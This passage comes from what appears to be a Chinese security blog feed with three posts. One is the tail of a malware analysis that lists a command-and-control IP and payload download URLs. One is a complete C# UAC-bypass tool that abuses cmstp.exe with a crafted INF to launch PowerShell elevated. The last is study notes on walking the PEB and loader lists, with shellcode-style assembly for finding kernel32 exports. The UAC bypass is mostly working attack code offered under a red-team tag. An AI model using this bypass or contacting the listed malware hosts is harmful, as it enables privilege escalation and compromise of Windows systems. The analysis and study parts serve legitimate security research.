$key + &quot;&#39;)&quot; + &#39;&quot;&#39;            Start-Process -FilePath cmd.exe -ArgumentList &quot;$onps&quot;        }else{}}catch{}kill $pid</code></pre><p>IP:188.166.162.201<br>脚本内的某些函数来源于:<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br>原ps1下载地址:<a href="http://188.166.162.201/update.png?mac=&amp;av=" target="_blank" rel="noopener">http://188.166.162.201/update.png?mac=&amp;av=</a>&lt;av_name&gt;&amp;version=&lt;os_version&gt;&amp;bit=&lt;os_arch&gt;&amp;flag2=&amp;domain=<groupname>&amp;user=<username>&amp;PS=False<br>后续下载地址:<a href="http://pslog.estonine.com/logging.php" target="_blank" rel="noopener">http://pslog.estonine.com/logging.php</a> <a href="http://p.estonine.com/p?smb" target="_blank" rel="noopener">http://p.estonine.com/p?smb</a> <a href="http://p.estonine.com/low?ipc" target="_blank" rel="noopener">http://p.estonine.com/low?ipc</a><br>微步查询:<br><a href="https://x.threatbook.cn/nodev4/domain/p.estonine.com" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/domain/p.estonine.com</a><br><a href="https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880" target="_blank" rel="noopener">https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880</a></username></groupname></p><p>update.png MD5:e279958da1c4dc11eb3a77909fce551e</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>能力有限，有没分析出来的见谅</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cmstp bypassuac研究</title>
      <link href="/posts/d38c8377.html"/>
      <url>/posts/d38c8377.html</url>
      <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.anquanke.com/post/id/86685" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86685</a><br><a href="https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g</a></p><p>对应的powershell脚本:</p><p><a href="https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1" target="_blank" rel="noopener">https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1</a></p><p>测试系统：</p><pre><code>* windows 10* windows 7* windows server 2012* windows server 2008</code></pre><p>C#改造</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Diagnostics;using System.Runtime.InteropServices;using System.Windows.Forms;using System.IO;using System.Threading.Tasks;namespace cmstp_bypassuac{    class Program    {        [DllImport(&quot;user32.dll&quot;, SetLastError = true)]        public static extern bool SetForegroundWindow(IntPtr hWnd);        public static string createinf() {            string filename = &quot;test.inf&quot;;            string command = @&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;;            string data = @&quot;[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall]CustomDestination=CustInstDestSectionAllUsersRunPreSetupCommands=RunPreSetupCommandsSection[RunPreSetupCommandsSection]; Commands Here will be run Before Setup Begins to install{0}taskkill /IM cmstp.exe /F[CustInstDestSectionAllUsers]49000,49001=AllUSer_LDIDSection, 7[AllUSer_LDIDSection]&quot;&quot;HKLM&quot;&quot;, &quot;&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;&quot;,  &quot;&quot;ProfileInstallPath&quot;&quot;, &quot;&quot; % UnexpectedError % &quot;&quot;, &quot;&quot;&quot;&quot;    [Strings]ServiceName = &quot;&quot;CorpVPN&quot;&quot;ShortSvcName = &quot;&quot;CorpVPN&quot;;            data = string.Format(data, command);            File.WriteAllText(filename, data);            if (File.Exists(filename))            {                Console.WriteLine(&quot;Create Inf File is ok&quot;);                var currentpath = System.IO.Directory.GetCurrentDirectory() +  &quot;\\&quot;+filename;                return currentpath;            }            else {                Console.WriteLine(&quot;Create Inf File Failure...&quot;);                return &quot;&quot;;            }        }        public static IntPtr execute() {            Process[] cmstpdata = Process.GetProcessesByName(&quot;cmstp&quot;); //获取CMSTP线程            if (cmstpdata.Length != 0)            {                cmstpdata[0].Refresh();                var windowhandle = cmstpdata[0].MainWindowHandle;                return windowhandle;            }            else            {                Console.WriteLine(&quot;Not Found cmstp handle,exit....&quot;);                return IntPtr.Zero;            }        }        static void Main(string[] args)        {            string infpath=createinf();            if (infpath.Length != 0)            {                ProcessStartInfo runcmd =new  ProcessStartInfo(&quot;C:\\Windows\\System32\\cmstp.exe&quot;);                runcmd.Arguments = &quot;/au \&quot;&quot;+infpath+&quot;\&quot;&quot;;                runcmd.UseShellExecute = false;                Process.Start(runcmd);                IntPtr windowhandle = execute();                //由于刚刚cmstp进程刚刚创建无法快速获取对应的窗口句柄，使用循环来解决                while (windowhandle == IntPtr.Zero) {                    windowhandle = execute();                }                Console.WriteLine(&quot;The Cmstp Handle:&quot; + windowhandle);                SetForegroundWindow(windowhandle); //将CMSTP窗口调出到前台并激活该窗口                SendKeys.SendWait(&quot;{ENTER}&quot;);                }        }       }}</code></pre><p>效果如下<br><img src="https://s3.ax1x.com/2021/03/04/6Zt5kj.gif" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PEB的深入学习</title>
      <link href="/posts/165f8274.html"/>
      <url>/posts/165f8274.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>纯属是之前乱弄shellcode编写的时候看见的PEB，然后当时做了笔记。不是很熟悉PEB这个，打算在了解一下。</p><h2 id="PEB是什么"><a href="#PEB是什么" class="headerlink" title="PEB是什么"></a>PEB是什么</h2><blockquote><p>进程环境块（PEB）是 Windows NT操作系统内部使用的数据结构，用以存储每个进程的运行时数据。[1] Microsoft的MSDN文档中仅公开了PEB的少数几个域，该结构“在未来的Windows版本中可能会修改”。[2]PEB包含的数据结构适用于整个进程，如全局上下文，启动参数，程序image装载器的数据结构，程序image的基地址，进程级互斥同步访问对象等。[1]<br>PEB与kernel mode EPROCESS数据结构密切相关。也是逐进程数据结构，在客户-服务器运行时子系统(CSRSS)进程地址空间被管理。但是，类似于CSRSS数据结构，PEB自身并不是内核模式数据结构。它驻留在所关联的进程的用户态内存空间中。这是因为它被设计为被操作系统的用户态的程序所使用，如NTDLL，在内核态之外执行，如程序映象的加载器与堆管理器。[3]<br>WinDbg中，卸载PEB内容的命令是!peb，命令参数是PEB在进程地址空间的地址，它实际上是通过!process命令获取，将显示来自于EPROCESS数据结构的信息，其中一个域是PEB地址。[3]</p></blockquote><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>windbg<br>od<br>vs</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>用汇编写一段寻找PEB地址的指令，然后编译逐渐调试。</p><pre><code class="asm">global _startsection .text    _start:        mov eax,[fs:0x30] ;EAX=PEB        mov eax,[eax+0xc] ;EAX=PEB-&gt;Ldr        mov esi,[eax+0x14] ;ESI=PEB-&gt;Ldr.InMemOrder (Ldr.InMemOrder地址赋到ESI寄存器)        lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址        xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)        lodsd ;EAX=Third(Kernel32)        mov ebx,[eax+0x10] ;EBX=Kernel32基地址        mov edx,[ebx+0x3c] ;EDX = DOS-&gt;e_lfanew (DOS头偏移地址)        add edx,ebx ;PE头地址获取        mov edx,[edx+0x78] ;IMAGE_EXPORT_DIRECTORY        add edx,ebx ;EDX = Export table        mov esi, [edx + 0x20]    ; ESI = Offset namestable        add esi, ebx             ; ESI = Names table        xor ecx, ecx             ; EXC = 0</code></pre><p>yasm和golink编译成exe</p><pre><code>yasm.win32.exe -f win32 -o test.obj test.asmGolink /ni /entry _start shell.obj</code></pre><p>然后拖入windbg调，自动解析PEB<code>!peb</code><br><img src="https://s3.ax1x.com/2021/02/22/y7XI41.png" alt=""></p><ul><li>InheritedAddressSpace: 继承的地址空间</li><li>ReadImageFileExecOptions: 读取文件镜像执行选项</li><li>BeingDebugged: 是否在被调试</li><li>ImageBaseAddress: 镜像基本的地址</li><li>Ldr: (到PEB_LDR_DATA结构的指针，提供被加载模块的信息。)包含kernel32 与ntdll的基地址</li><li>SubSystemData: 子系统数据</li><li>ProcessHeap: 进程堆栈首地址</li><li>ProcessParameters: 进程参数地址</li><li>CurrentDirectory: 当前目录</li><li>WindowTitle: 窗口标题</li><li>ImageFile: 镜像我呢见</li><li>CommandLine: 命令行</li><li>DllPath: DLL路径</li><li>Environment: 环境</li></ul><p>手动解析PEB<code>dt _PEB @$peb</code></p><pre><code class="asm">ntdll!_PEB   +0x000 InheritedAddressSpace : 0 &#39;&#39;   +0x001 ReadImageFileExecOptions : 0 &#39;&#39;   +0x002 BeingDebugged    : 0x1 &#39;&#39;   +0x003 BitField         : 0 &#39;&#39;   +0x003 ImageUsesLargePages : 0y0   +0x003 IsProtectedProcess : 0y0   +0x003 IsImageDynamicallyRelocated : 0y0   +0x003 SkipPatchingUser32Forwarders : 0y0   +0x003 IsPackagedProcess : 0y0   +0x003 IsAppContainer   : 0y0   +0x003 IsProtectedProcessLight : 0y0   +0x003 IsLongPathAwareProcess : 0y0   +0x004 Mutant           : 0xffffffff Void   +0x008 ImageBaseAddress : 0x00400000 Void   +0x00c Ldr              : 0x7750dca0 _PEB_LDR_DATA   +0x010 ProcessParameters : 0x004b1d38 _RTL_USER_PROCESS_PARAMETERS   +0x014 SubSystemData    : (null)    +0x018 ProcessHeap      : 0x004b0000 Void   +0x01c FastPebLock      : 0x7750da60 _RTL_CRITICAL_SECTION   +0x020 AtlThunkSListPtr : (null)    +0x024 IFEOKey          : (null)    +0x028 CrossProcessFlags : 3   +0x028 ProcessInJob     : 0y1   +0x028 ProcessInitializing : 0y1   +0x028 ProcessUsingVEH  : 0y0   +0x028 ProcessUsingVCH  : 0y0   +0x028 ProcessUsingFTH  : 0y0   +0x028 ProcessPreviouslyThrottled : 0y0   +0x028 ProcessCurrentlyThrottled : 0y0   +0x028 ProcessImagesHotPatched : 0y0   +0x028 ReservedBits0    : 0y000000000000000000000000 (0)   +0x02c KernelCallbackTable : (null)    +0x02c UserSharedInfoPtr : (null)    +0x030 SystemReserved   : 0   +0x034 AtlThunkSListPtr32 : (null)    +0x038 ApiSetMap        : 0x00040000 Void   +0x03c TlsExpansionCounter : 0   +0x040 TlsBitmap        : 0x7750dc50 Void   +0x044 TlsBitmapBits    : [2] 0x10001   +0x04c ReadOnlySharedMemoryBase : 0x7fe40000 Void   +0x050 SharedData       : (null)    +0x054 ReadOnlyStaticServerData : 0x7fe40750  -&gt; (null)    +0x058 AnsiCodePageData : 0x7ffa0000 Void   +0x05c OemCodePageData  : 0x7ffa0000 Void   +0x060 UnicodeCaseTableData : 0x7ffd0028 Void   +0x064 NumberOfProcessors : 0xc   +0x068 NtGlobalFlag     : 0x70   +0x070 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000   +0x078 HeapSegmentReserve : 0x100000   +0x07c HeapSegmentCommit : 0x2000   +0x080 HeapDeCommitTotalFreeThreshold : 0x10000   +0x084 HeapDeCommitFreeBlockThreshold : 0x1000   +0x088 NumberOfHeaps    : 1   +0x08c MaximumNumberOfHeaps : 0x10   +0x090 ProcessHeaps     : 0x7750c760  -&gt; 0x004b0000 Void   +0x094 GdiSharedHandleTable : (null)    +0x098 ProcessStarterHelper : (null)    +0x09c GdiDCAttributeList : 0   +0x0a0 LoaderLock       : 0x7750b3d0 _RTL_CRITICAL_SECTION   +0x0a4 OSMajorVersion   : 0xa   +0x0a8 OSMinorVersion   : 0   +0x0ac OSBuildNumber    : 0x47bb   +0x0ae OSCSDVersion     : 0   +0x0b0 OSPlatformId     : 2   +0x0b4 ImageSubsystem   : 2   +0x0b8 ImageSubsystemMajorVersion : 4   +0x0bc ImageSubsystemMinorVersion : 0   +0x0c0 ActiveProcessAffinityMask : 0xfff   +0x0c4 GdiHandleBuffer  : [34] 0   +0x14c PostProcessInitRoutine : (null)    +0x150 TlsExpansionBitmap : 0x7750dc38 Void   +0x154 TlsExpansionBitmapBits : [32] 1   +0x1d4 SessionId        : 1   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER 0x0   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0   +0x1e8 pShimData        : 0x001b0000 Void   +0x1ec AppCompatInfo    : (null)    +0x1f0 CSDVersion       : _UNICODE_STRING &quot;&quot;   +0x1f8 ActivationContextData : (null)    +0x1fc ProcessAssemblyStorageMap : (null)    +0x200 SystemDefaultActivationContextData : 0x001a0000 _ACTIVATION_CONTEXT_DATA   +0x204 SystemAssemblyStorageMap : (null)    +0x208 MinimumStackCommit : 0   +0x20c SparePointers    : [4] (null)    +0x21c SpareUlongs      : [5] 0   +0x230 WerRegistrationData : (null)    +0x234 WerShipAssertPtr : (null)    +0x238 pUnused          : (null)    +0x23c pImageHeaderHash : (null)    +0x240 TracingFlags     : 0   +0x240 HeapTracingEnabled : 0y0   +0x240 CritSecTracingEnabled : 0y0   +0x240 LibLoaderTracingEnabled : 0y0   +0x240 SpareTracingBits : 0y00000000000000000000000000000 (0)   +0x248 CsrServerReadOnlySharedMemoryBase : 0x00007df4`2f970000   +0x250 TppWorkerpListLock : 0   +0x254 TppWorkerpList   : _LIST_ENTRY [ 0x276254 - 0x276254 ]   +0x25c WaitOnAddressHashTable : [128] (null)    +0x45c TelemetryCoverageHeader : (null)    +0x460 CloudFileFlags   : 0x60   +0x464 CloudFileDiagFlags : 0   +0x468 PlaceholderCompatibilityMode : 1 &#39;&#39;   +0x469 PlaceholderCompatibilityModeReserved : [7]  &quot;&quot;   +0x470 LeapSecondData   : 0x7ff90000 _LEAP_SECOND_DATA   +0x474 LeapSecondFlags  : 0   +0x474 SixtySecondEnabled : 0y0   +0x474 Reserved         : 0y0000000000000000000000000000000 (0)   +0x478 NtGlobalFlag2    : 0</code></pre><p>这里比较重要的是Ldr,(PEB_LDR_DATA结构的指针，提供被加载模块的信息。)</p><p>Ldr分析<br><img src="https://s3.ax1x.com/2021/02/22/yHnGZj.png" alt=""></p><pre><code class="asm">   +0x000 Length           : 0x30   +0x004 Initialized      : 0x1 &#39;&#39;   +0x008 SsHandle         : (null)    +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4b3720 - 0x4b3d30 ]  //按加载顺序   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4b3728 - 0x4b3d38 ] //按内存顺序   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4b3628 - 0x4b3d40 ] //按初始化顺序   +0x024 EntryInProgress  : (null)    +0x028 ShutdownInProgress : 0 &#39;&#39;   +0x02c ShutdownThreadId : (null) </code></pre><p>InLoadOrderModuleList、InMemoryOrderModuleList、InMemoryOrderModuleList这三个是双向链表<br>(其实三个都一样，顺序不同而已)<br>对应的格式为 LIST_ENTRY</p><pre><code class="asm">0:000&gt; dt _LIST_ENTRYntdll!_LIST_ENTRY   +0x000 Flink            : Ptr32 _LIST_ENTRY   +0x004 Blink            : Ptr32 _LIST_ENTRY</code></pre><p><strong>LDR_DATA_TABLE_ENTRY structure,双向循环链表</strong>吧，从一个方向开始，不停的循环，就回到初始位了，就相当于遍历了一次</p><p>结构如下</p><pre><code class="asm">0:000&gt; dt _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY   +0x008 InMemoryOrderLinks : _LIST_ENTRY   +0x010 InInitializationOrderLinks : _LIST_ENTRY   +0x018 DllBase          : Ptr32 Void   +0x01c EntryPoint       : Ptr32 Void   +0x020 SizeOfImage      : Uint4B   +0x024 FullDllName      : _UNICODE_STRING   +0x02c BaseDllName      : _UNICODE_STRING   +0x034 FlagGroup        : [4] UChar   +0x034 Flags            : Uint4B   +0x034 PackagedBinary   : Pos 0, 1 Bit   +0x034 MarkedForRemoval : Pos 1, 1 Bit   +0x034 ImageDll         : Pos 2, 1 Bit   +0x034 LoadNotificationsSent : Pos 3, 1 Bit   +0x034 TelemetryEntryProcessed : Pos 4, 1 Bit   +0x034 ProcessStaticImport : Pos 5, 1 Bit   +0x034 InLegacyLists    : Pos 6, 1 Bit   +0x034 InIndexes        : Pos 7, 1 Bit   +0x034 ShimDll          : Pos 8, 1 Bit   +0x034 InExceptionTable : Pos 9, 1 Bit   +0x034 ReservedFlags1   : Pos 10, 2 Bits   +0x034 LoadInProgress   : Pos 12, 1 Bit   +0x034 LoadConfigProcessed : Pos 13, 1 Bit   +0x034 EntryProcessed   : Pos 14, 1 Bit   +0x034 ProtectDelayLoad : Pos 15, 1 Bit   +0x034 ReservedFlags3   : Pos 16, 2 Bits   +0x034 DontCallForThreads : Pos 18, 1 Bit   +0x034 ProcessAttachCalled : Pos 19, 1 Bit   +0x034 ProcessAttachFailed : Pos 20, 1 Bit   +0x034 CorDeferredValidate : Pos 21, 1 Bit   +0x034 CorImage         : Pos 22, 1 Bit   +0x034 DontRelocate     : Pos 23, 1 Bit   +0x034 CorILOnly        : Pos 24, 1 Bit   +0x034 ChpeImage        : Pos 25, 1 Bit   +0x034 ReservedFlags5   : Pos 26, 2 Bits   +0x034 Redirected       : Pos 28, 1 Bit   +0x034 ReservedFlags6   : Pos 29, 2 Bits   +0x034 CompatDatabaseProcessed : Pos 31, 1 Bit   +0x038 ObsoleteLoadCount : Uint2B   +0x03a TlsIndex         : Uint2B   +0x03c HashLinks        : _LIST_ENTRY   +0x044 TimeDateStamp    : Uint4B   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT   +0x04c Lock             : Ptr32 Void   +0x050 DdagNode         : Ptr32 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY   +0x05c LoadContext      : Ptr32 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : Ptr32 Void   +0x064 SwitchBackContext : Ptr32 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : Uint4B   +0x088 LoadTime         : _LARGE_INTEGER   +0x090 BaseNameHashValue : Uint4B   +0x094 LoadReason       : _LDR_DLL_LOAD_REASON   +0x098 ImplicitPathOptions : Uint4B   +0x09c ReferenceCount   : Uint4B   +0x0a0 DependentLoadFlags : Uint4B   +0x0a4 SigningLevel     : UChar</code></pre><p>跟上面的汇编一样找InMemoryOrderModuleList来遍历<code>0x4b3728 - 0x4b3d38</code>这个地址范围里存着对应的内存顺序载入过程</p><pre><code class="asm">0:000&gt; dt 0x4b3728 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3620 - 0x7750dcb4 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x401000 ]   +0x018 DllBase          : 0x00002000 Void   +0x01c EntryPoint       : 0x00620060 Void   +0x020 SizeOfImage      : 0x4b21fc   +0x024 FullDllName      : _UNICODE_STRING &quot;test.exe&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;P???&quot;   +0x034 Flags            : 0x7750db50   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb50   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x6032501a - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b37e0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b37e0 Void   +0x050 DdagNode         : 0x004b37e0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x19fa64 - 0x0 ]   +0x05c LoadContext      : 0x773f1124 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : (null)    +0x064 SwitchBackContext : 0x004b3d98 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`33df1536   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;</code></pre><p>然后通过不断遍历链表元素里的InLoadOrderLinks，最后找到kernel32.dll</p><pre><code class="asm">0:000&gt; dt 0x4b3728 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3620 - 0x7750dcb4 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x401000 ]   +0x018 DllBase          : 0x00002000 Void   +0x01c EntryPoint       : 0x00620060 Void   +0x020 SizeOfImage      : 0x4b21fc   +0x024 FullDllName      : _UNICODE_STRING &quot;test.exe&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;P???&quot;   +0x034 Flags            : 0x7750db50   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb50   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x6032501a - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b37e0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b37e0 Void   +0x050 DdagNode         : 0x004b37e0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x19fa64 - 0x0 ]   +0x05c LoadContext      : 0x773f1124 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : (null)    +0x064 SwitchBackContext : 0x004b3d98 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`33df1536   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;0:000&gt; dt 0x4b3620 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3b08 - 0x4b3728 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4b3ed0 - 0x7750dcbc ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x773f0000 - 0x0 ]   +0x018 DllBase          : 0x0019a000 Void   +0x01c EntryPoint       : 0x003c003a Void   +0x020 SizeOfImage      : 0x4b34f8   +0x024 FullDllName      : _UNICODE_STRING &quot;ntdll.dll&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;@???&quot;   +0x034 Flags            : 0x7750db40   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y0   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb40   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x1e699fab - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b36d8 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b36d8 Void   +0x050 DdagNode         : 0x004b36d8 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x05c LoadContext      : (null)    +0x060 ParentDllBase    : 0x004b3f28 Void   +0x064 SwitchBackContext : (null)    +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0xf46857d4   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0x800   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;0:000&gt; dt 0x4b3b08 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3ec8 - 0x4b3620 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4b3d40 - 0x4b3ed0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x75f50000 - 0x75f65f70 ]   +0x018 DllBase          : 0x000e0000 Void   +0x01c EntryPoint       : 0x00420040 Void   +0x020 SizeOfImage      : 0x4b3c08   +0x024 FullDllName      : _UNICODE_STRING &quot;KERNEL32.DLL&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;0???&quot;   +0x034 Flags            : 0x7750db30   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y1   +0x034 InLegacyLists    : 0y0   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   